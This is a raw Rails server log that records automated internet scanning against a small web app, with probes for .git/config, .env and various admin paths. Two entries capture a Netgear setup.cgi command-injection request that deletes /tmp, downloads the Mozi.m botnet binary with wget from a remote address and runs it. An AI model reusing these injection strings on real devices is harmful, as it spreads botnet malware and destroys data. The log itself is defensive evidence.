I, [2023-05-21T18:13:36.795017 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 504)
I, [2023-05-21T18:13:37.484222 #2866]  INFO -- : Started GET "/.git/config" for 5.180.209.190 at 2023-05-21 18:13:37 +0900
I, [2023-05-21T18:13:37.510185 #2866]  INFO -- : Processing by UserController#index as HTML
I, [2023-05-21T18:13:37.510272 #2866]  INFO -- :   Parameters: {"all"=>".git/config"}
I, [2023-05-21T18:13:37.510728 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T18:13:37.511479 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 297)
I, [2023-05-21T18:13:37.511658 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 505)
I, [2023-05-21T18:21:02.900362 #2866]  INFO -- : Started GET "/.git/config" for 18.169.104.106 at 2023-05-21 18:21:02 +0900
I, [2023-05-21T18:21:02.901089 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T18:21:02.901140 #2866]  INFO -- :   Parameters: {"all"=>".git/config"}
I, [2023-05-21T18:21:02.901662 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T18:21:02.902438 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-05-21T18:21:02.902655 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-05-21T18:21:30.600883 #2866]  INFO -- : Started GET "/" for 69.164.217.74 at 2023-05-21 18:21:30 +0900
I, [2023-05-21T18:21:30.601921 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T18:21:30.602427 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T18:21:30.603278 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-05-21T18:21:30.603477 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-05-21T18:25:27.590188 #2866]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 43.154.141.71 at 2023-05-21 18:25:27 +0900
I, [2023-05-21T18:25:27.591171 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T18:25:27.591221 #2866]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-05-21T18:25:27.591704 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T18:25:27.592429 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-05-21T18:25:27.592609 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 505)
I, [2023-05-21T19:00:30.080897 #2866]  INFO -- : Started GET "/" for 184.105.139.68 at 2023-05-21 19:00:30 +0900
I, [2023-05-21T19:00:30.081605 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T19:00:30.082156 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T19:00:30.082922 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-05-21T19:00:30.083180 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-05-21T19:03:05.317917 #2866]  INFO -- : Started GET "/geoserver/web/" for 184.105.139.68 at 2023-05-21 19:03:05 +0900
I, [2023-05-21T19:03:05.318583 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T19:03:05.318640 #2866]  INFO -- :   Parameters: {"all"=>"geoserver/web"}
I, [2023-05-21T19:03:05.319200 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.1ms | Allocations: 4)
I, [2023-05-21T19:03:05.320082 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 299)
I, [2023-05-21T19:03:05.320284 #2866]  INFO -- : Completed 200 OK in 2ms (Views: 1.3ms | Allocations: 521)
I, [2023-05-21T19:20:14.328346 #2866]  INFO -- : Started GET "/systembc/password.php" for 45.56.108.128 at 2023-05-21 19:20:14 +0900
I, [2023-05-21T19:20:14.329002 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T19:20:14.329050 #2866]  INFO -- :   Parameters: {"all"=>"systembc/password"}
I, [2023-05-21T19:20:14.329542 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T19:20:14.330289 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-05-21T19:20:14.330472 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 514)
I, [2023-05-21T19:20:57.454434 #2866]  INFO -- : Started GET "/.env" for 185.254.196.173 at 2023-05-21 19:20:57 +0900
I, [2023-05-21T19:20:57.455106 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T19:20:57.455184 #2866]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-05-21T19:20:57.455950 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T19:20:57.456674 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-05-21T19:20:57.456882 #2866]  INFO -- : Completed 200 OK in 2ms (Views: 1.4ms | Allocations: 521)
I, [2023-05-21T19:20:59.012969 #2866]  INFO -- : Started POST "/" for 185.254.196.173 at 2023-05-21 19:20:59 +0900
F, [2023-05-21T19:20:59.013372 #2866] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-05-21T19:31:36.267764 #2866]  INFO -- : Started GET "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://27.41.19.49:42612/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1" for 27.41.19.49 at 2023-05-21 19:31:36 +0900
I, [2023-05-21T19:31:36.268541 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T19:31:36.268600 #2866]  INFO -- :   Parameters: {"next_file"=>"netgear.cfg", "todo"=>"syscmd", "cmd"=>"rm -rf /tmp/*", "wget http://27.41.19.49:42612/Mozi.m -O /tmp/netgear"=>nil, "sh netgear"=>nil, "curpath"=>"/", "currentsetting.htm"=>"1", "all"=>"setup"}
I, [2023-05-21T19:31:36.269227 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T19:31:36.269958 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-05-21T19:31:36.270141 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.3ms | Allocations: 514)
I, [2023-05-21T19:36:54.030307 #2866]  INFO -- : Started GET "/systembc/password.php" for 45.56.108.128 at 2023-05-21 19:36:54 +0900
I, [2023-05-21T19:36:54.030955 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T19:36:54.031004 #2866]  INFO -- :   Parameters: {"all"=>"systembc/password"}
I, [2023-05-21T19:36:54.031680 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T19:36:54.032419 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 298)
I, [2023-05-21T19:36:54.032603 #2866]  INFO -- : Completed 200 OK in 2ms (Views: 1.3ms | Allocations: 513)
I, [2023-05-21T19:44:12.961319 #2866]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 43.154.141.71 at 2023-05-21 19:44:12 +0900
I, [2023-05-21T19:44:12.962008 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T19:44:12.962058 #2866]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-05-21T19:44:12.962563 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T19:44:12.963406 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 298)
I, [2023-05-21T19:44:12.963592 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 504)
I, [2023-05-21T19:52:04.014993 #2866]  INFO -- : Started GET "/" for 45.33.80.243 at 2023-05-21 19:52:04 +0900
I, [2023-05-21T19:52:04.015714 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T19:52:04.016241 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T19:52:04.016973 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-05-21T19:52:04.017183 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 521)
I, [2023-05-21T20:42:35.500250 #2866]  INFO -- : Started GET "/.env" for 135.125.246.189 at 2023-05-21 20:42:35 +0900
I, [2023-05-21T20:42:35.500953 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T20:42:35.501016 #2866]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-05-21T20:42:35.501538 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T20:42:35.502561 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.1ms | Allocations: 299)
I, [2023-05-21T20:42:35.502777 #2866]  INFO -- : Completed 200 OK in 2ms (Views: 1.4ms | Allocations: 521)
I, [2023-05-21T20:42:36.035067 #2866]  INFO -- : Started POST "/" for 135.125.246.189 at 2023-05-21 20:42:36 +0900
F, [2023-05-21T20:42:36.035502 #2866] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-05-21T21:03:02.187351 #2866]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 43.154.141.71 at 2023-05-21 21:03:02 +0900
I, [2023-05-21T21:03:02.188031 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T21:03:02.188080 #2866]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-05-21T21:03:02.188590 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T21:03:02.189322 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-05-21T21:03:02.189519 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 505)
I, [2023-05-21T21:07:15.253248 #2866]  INFO -- : Started GET "/" for 34.139.211.50 at 2023-05-21 21:07:15 +0900
I, [2023-05-21T21:07:15.253917 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T21:07:15.254434 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T21:07:15.255210 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-05-21T21:07:15.255420 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-05-21T21:37:02.733870 #2866]  INFO -- : Started GET "/.env" for 135.125.246.189 at 2023-05-21 21:37:02 +0900
I, [2023-05-21T21:37:02.734540 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T21:37:02.734589 #2866]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-05-21T21:37:02.735095 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T21:37:02.735869 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-05-21T21:37:02.736075 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-05-21T21:37:03.262206 #2866]  INFO -- : Started POST "/" for 135.125.246.189 at 2023-05-21 21:37:03 +0900
F, [2023-05-21T21:37:03.262760 #2866] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-05-21T21:43:36.330386 #2866]  INFO -- : Started GET "/" for 139.162.84.205 at 2023-05-21 21:43:36 +0900
I, [2023-05-21T21:43:36.331039 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T21:43:36.331602 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T21:43:36.332498 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-05-21T21:43:36.332713 #2866]  INFO -- : Completed 200 OK in 2ms (Views: 1.3ms | Allocations: 521)
I, [2023-05-21T21:55:01.944550 #2866]  INFO -- : Started GET "/.git/config" for 66.228.40.119 at 2023-05-21 21:55:01 +0900
I, [2023-05-21T21:55:01.945257 #2866]  INFO -- : Processing by UserController#index as HTML
I, [2023-05-21T21:55:01.945307 #2866]  INFO -- :   Parameters: {"all"=>".git/config"}
I, [2023-05-21T21:55:01.945810 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T21:55:01.946568 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-05-21T21:55:01.946761 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 512)
I, [2023-05-21T22:22:49.867963 #2866]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 43.154.141.71 at 2023-05-21 22:22:49 +0900
I, [2023-05-21T22:22:49.868629 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T22:22:49.868679 #2866]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-05-21T22:22:49.869172 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T22:22:49.869894 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 298)
I, [2023-05-21T22:22:49.870082 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 504)
I, [2023-05-21T22:32:29.537954 #2866]  INFO -- : Started GET "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1" for 120.86.238.153 at 2023-05-21 22:32:29 +0900
I, [2023-05-21T22:32:29.538756 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T22:32:29.538825 #2866]  INFO -- :   Parameters: {"next_file"=>"netgear.cfg", "todo"=>"syscmd", "cmd"=>"rm -rf /tmp/*", "wget http://192.168.1.1:8088/Mozi.m -O /tmp/netgear"=>nil, "sh netgear"=>nil, "curpath"=>"/", "currentsetting.htm"=>"1", "all"=>"setup"}
I, [2023-05-21T22:32:29.539384 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T22:32:29.540106 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 298)
I, [2023-05-21T22:32:29.540289 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 513)
I, [2023-05-21T22:37:40.949784 #2866]  INFO -- : Started GET "/" for 153.232.97.50 at 2023-05-21 22:37:40 +0900
I, [2023-05-21T22:37:40.950455 #2866]  INFO -- : Processing by UserController#index as HTML
I, [2023-05-21T22:37:40.950959 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T22:37:40.951732 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 298)
I, [2023-05-21T22:37:40.951927 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 512)
I, [2023-05-21T23:26:44.350772 #2866]  INFO -- : Started GET "/.env" for 135.125.246.189 at 2023-05-21 23:26:44 +0900
I, [2023-05-21T23:26:44.351521 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T23:26:44.351573 #2866]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-05-21T23:26:44.352096 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T23:26:44.353057 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 299)
I, [2023-05-21T23:26:44.353271 #2866]  INFO -- : Completed 200 OK in 2ms (Views: 1.4ms | Allocations: 521)
I, [2023-05-21T23:26:44.887802 #2866]  INFO -- : Started POST "/" for 135.125.246.189 at 2023-05-21 23:26:44 +0900
F, [2023-05-21T23:26:44.888205 #2866] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-05-21T23:29:11.364695 #2866]  INFO -- : Started GET "/" for 35.187.98.121 at 2023-05-21 23:29:11 +0900
I, [2023-05-21T23:29:11.365359 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T23:29:11.366138 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T23:29:11.366879 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-05-21T23:29:11.367091 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 521)
I, [2023-05-21T23:36:52.344200 #7327]  INFO -- : Migrating to CreateProjectCompanies (20230315031113)
I, [2023-05-21T23:36:52.353711 #7327]  INFO -- : Migrating to CreateJkkUsers (20221030071956)
I, [2023-05-21T23:36:52.357822 #7327]  INFO -- : Migrating to CreateProjectImageComments (20221027225829)
I, [2023-05-21T23:36:52.362716 #7327]  INFO -- : Migrating to CreateComments (20221022000327)
I, [2023-05-21T23:37:31.567629 #7396]  INFO -- : Migrating to CreateComments (20221022000327)
I, [2023-05-21T23:37:31.604271 #7396]  INFO -- : Migrating to CreateProjectImageComments (20221027225829)
I, [2023-05-21T23:37:31.617229 #7396]  INFO -- : Migrating to CreateJkkUsers (20221030071956)
I, [2023-05-21T23:37:31.626565 #7396]  INFO -- : Migrating to CreateProjectCompanies (20230315031113)
I, [2023-05-21T23:37:33.961548 #7158]  INFO -- : Started GET "/" for 165.232.94.52 at 2023-05-21 23:37:33 +0900
I, [2023-05-21T23:37:33.963291 #7158]  INFO -- : Processing by UserController#index as HTML
I, [2023-05-21T23:37:33.965873 #7158]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.3ms | Allocations: 153)
I, [2023-05-21T23:37:33.972769 #7158]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 7.3ms | Allocations: 1046)
I, [2023-05-21T23:37:33.973052 #7158]  INFO -- : Completed 200 OK in 10ms (Views: 8.5ms | Allocations: 2348)
I, [2023-05-21T23:37:58.109472 #7158]  INFO -- : Started GET "/" for 172.105.34.155 at 2023-05-21 23:37:58 +0900
I, [2023-05-21T23:37:58.110211 #7158]  INFO -- : Processing by UserController#index as HTML
I, [2023-05-21T23:37:58.110710 #7158]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T23:37:58.111491 #7158]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 297)
I, [2023-05-21T23:37:58.111670 #7158]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-05-21T23:44:24.262701 #7158]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 43.154.141.71 at 2023-05-21 23:44:24 +0900
I, [2023-05-21T23:44:24.263472 #7158]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T23:44:24.263525 #7158]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-05-21T23:44:24.264374 #7158]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T23:44:24.265073 #7158]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 298)
I, [2023-05-21T23:44:24.265236 #7158]  INFO -- : Completed 200 OK in 2ms (Views: 1.1ms | Allocations: 650)
I, [2023-05-21T23:44:57.491417 #7158]  INFO -- : Started GET "/" for 94.102.61.10 at 2023-05-21 23:44:57 +0900
I, [2023-05-21T23:44:57.492151 #7158]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T23:44:57.492671 #7158]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T23:44:57.493423 #7158]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 298)
I, [2023-05-21T23:44:57.493629 #7158]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 519)
